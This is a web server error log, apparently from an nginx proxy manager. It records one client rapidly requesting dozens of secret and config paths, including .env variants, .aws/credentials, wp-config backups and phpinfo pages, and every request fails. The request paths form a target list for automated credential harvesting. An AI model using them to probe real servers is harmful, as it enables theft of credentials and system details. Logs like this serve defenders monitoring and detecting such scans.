2025/09/03 03:17:25 [error] 1969#1969: *8736 open() "/var/www/html/portal/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /portal/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:25 [error] 1969#1969: *8736 open() "/var/www/html/env/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /env/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:25 [error] 1969#1969: *8736 open() "/var/www/html/api/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /api/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:25 [error] 1969#1969: *8736 open() "/var/www/html/app/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /app/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:26 [error] 1969#1969: *8736 open() "/var/www/html/dev/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /dev/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:26 [error] 1969#1969: *8736 open() "/var/www/html/new/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /new/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:26 [error] 1969#1969: *8736 open() "/var/www/html/new/.env.local" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /new/.env.local HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:26 [error] 1969#1969: *8736 open() "/var/www/html/new/.env.production" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /new/.env.production HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:26 [error] 1969#1969: *8736 open() "/var/www/html/new/.env.staging" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /new/.env.staging HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:27 [error] 1969#1969: *8736 open() "/var/www/html/_phpinfo.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /_phpinfo.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:27 [error] 1969#1969: *8736 open() "/var/www/html/_profiler/phpinfo" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /_profiler/phpinfo HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:27 [error] 1969#1969: *8736 open() "/var/www/html/_profiler/phpinfo/info.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /_profiler/phpinfo/info.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:27 [error] 1969#1969: *8736 open() "/var/www/html/_profiler/phpinfo/phpinfo.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /_profiler/phpinfo/phpinfo.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:27 [error] 1969#1969: *8736 open() "/var/www/html/wp-config" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /wp-config HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:28 [error] 1969#1969: *8736 open() "/var/www/html/aws-secret.yaml" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /aws-secret.yaml HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:28 [error] 1969#1969: *8736 open() "/var/www/html/awstats/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /awstats/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:28 [error] 1969#1969: *8736 open() "/var/www/html/conf/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /conf/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:28 [error] 1969#1969: *8736 open() "/var/www/html/cron/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /cron/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:28 [error] 1969#1969: *8736 open() "/var/www/html/www/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /www/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:28 [error] 1969#1969: *8736 open() "/var/www/html/docker/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /docker/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:29 [error] 1969#1969: *8736 open() "/var/www/html/docker/app/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /docker/app/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:29 [error] 1969#1969: *8736 open() "/var/www/html/env.backup" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /env.backup HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:29 [error] 1969#1969: *8736 open() "/var/www/html/xampp/phpinfo.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /xampp/phpinfo.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:29 [error] 1969#1969: *8736 open() "/var/www/html/lara/info.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /lara/info.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:29 [error] 1969#1969: *8736 open() "/var/www/html/lara/phpinfo.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /lara/phpinfo.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:30 [error] 1969#1969: *8736 open() "/var/www/html/laravel/info.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /laravel/info.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:30 [error] 1969#1969: *8736 open() "/var/www/html/.vscode/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.vscode/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:30 [error] 1969#1969: *8736 open() "/var/www/html/js/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /js/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:30 [error] 1969#1969: *8736 open() "/var/www/html/laravel/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /laravel/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:30 [error] 1969#1969: *8736 open() "/var/www/html/laravel/core/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /laravel/core/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:30 [error] 1969#1969: *8736 open() "/var/www/html/mail/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /mail/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:31 [error] 1969#1969: *8736 open() "/var/www/html/mailer/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /mailer/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:31 [error] 1969#1969: *8736 open() "/var/www/html/nginx/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /nginx/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:31 [error] 1969#1969: *8736 open() "/var/www/html/public/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /public/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:31 [error] 1969#1969: *8736 open() "/var/www/html/site/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /site/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:31 [error] 1969#1969: *8736 open() "/var/www/html/xampp/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /xampp/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:32 [error] 1969#1969: *8736 open() "/var/www/html/main/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /main/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:32 [error] 1969#1969: *8736 open() "/var/www/html/node_modules/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /node_modules/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:32 [error] 1969#1969: *8736 open() "/var/www/html/kyc/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /kyc/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:32 [error] 1969#1969: *8736 open() "/var/www/html/admin/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /admin/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:32 [error] 1969#1969: *8736 open() "/var/www/html/prod/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /prod/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:32 [error] 1969#1969: *8736 open() "/var/www/html/.env.bak" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env.bak HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:33 [error] 1969#1969: *8736 open() "/var/www/html/api/shared/config/config.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /api/shared/config/config.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:33 [error] 1969#1969: *8736 open() "/var/www/html/api/shared/config.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /api/shared/config.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:33 [error] 1969#1969: *8736 open() "/var/www/html/config.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /config.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:33 [error] 1969#1969: *8736 open() "/var/www/html/website/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /website/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:33 [error] 1969#1969: *8736 open() "/var/www/html/development/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /development/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:34 [error] 1969#1969: *8736 open() "/var/www/html/backend/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /backend/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:34 [error] 1969#1969: *8736 open() "/var/www/html/api/shared/config/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /api/shared/config/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:34 [error] 1969#1969: *8736 open() "/var/www/html/api/shared/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /api/shared/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:34 [error] 1969#1969: *8736 open() "/var/www/html/api/config.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /api/config.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:34 [error] 1969#1969: *8736 open() "/var/www/html/service/email_service.py" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /service/email_service.py HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:35 [error] 1969#1969: *8736 open() "/var/www/html/node/.env_example" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /node/.env_example HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:35 [error] 1969#1969: *8736 open() "/var/www/html/.env.production.local" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env.production.local HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:35 [error] 1969#1969: *8736 open() "/var/www/html/.env.local" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env.local HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:35 [error] 1969#1969: *8736 open() "/var/www/html/.env.example" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env.example HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:35 [error] 1969#1969: *8736 open() "/var/www/html/.env.stage" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env.stage HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:37 [error] 1969#1969: *8736 open() "/var/www/html/.env.old" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env.old HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:37 [error] 1969#1969: *8736 open() "/var/www/html/.env_sample" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env_sample HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:38 [error] 1969#1969: *8736 open() "/var/www/html/.env.prod" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env.prod HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:38 [error] 1969#1969: *8736 open() "/var/www/html/crm/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /crm/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:38 [error] 1969#1969: *8736 open() "/var/www/html/local/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /local/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:38 [error] 1969#1969: *8736 open() "/var/www/html/core/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /core/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:38 [error] 1969#1969: *8736 open() "/var/www/html/apps/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /apps/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:38 [error] 1969#1969: *8736 open() "/var/www/html/application/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /application/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:39 [error] 1969#1969: *8736 open() "/var/www/html/web/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /web/.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:39 [error] 1969#1969: *8736 open() "/var/www/html/.aws/credentials" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.aws/credentials HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:39 [error] 1969#1969: *8736 open() "/var/www/html/wp-config.php.bak" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /wp-config.php.bak HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:39 [error] 1969#1969: *8736 open() "/var/www/html/info.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /info.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:39 [error] 1969#1969: *8736 open() "/var/www/html/dashboard/phpinfo.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /dashboard/phpinfo.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:42 [error] 1969#1969: *8736 open() "/var/www/html/admin/server_info.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /admin/server_info.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:42 [error] 1969#1969: *8736 open() "/var/www/html/server_info.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /server_info.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:42 [error] 1969#1969: *8736 open() "/var/www/html/app_dev.php/_profiler/phpinfo" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /app_dev.php/_profiler/phpinfo HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:42 [error] 1969#1969: *8736 open() "/var/www/html/test.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /test.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:42 [error] 1969#1969: *8736 open() "/var/www/html/server-info" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /server-info HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:43 [error] 1969#1969: *8736 open() "/var/www/html/server-info.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /server-info.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:43 [error] 1969#1969: *8736 open() "/var/www/html/secured/phpinfo.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /secured/phpinfo.php HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:44 [error] 1969#1969: *8736 open() "/var/www/html/appsettings.json" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /appsettings.json HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:45 [error] 1969#1969: *8736 open() "/var/www/html/config/aws.yml" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /config/aws.yml HTTP/1.1", host: "call.landingdev.xyz"
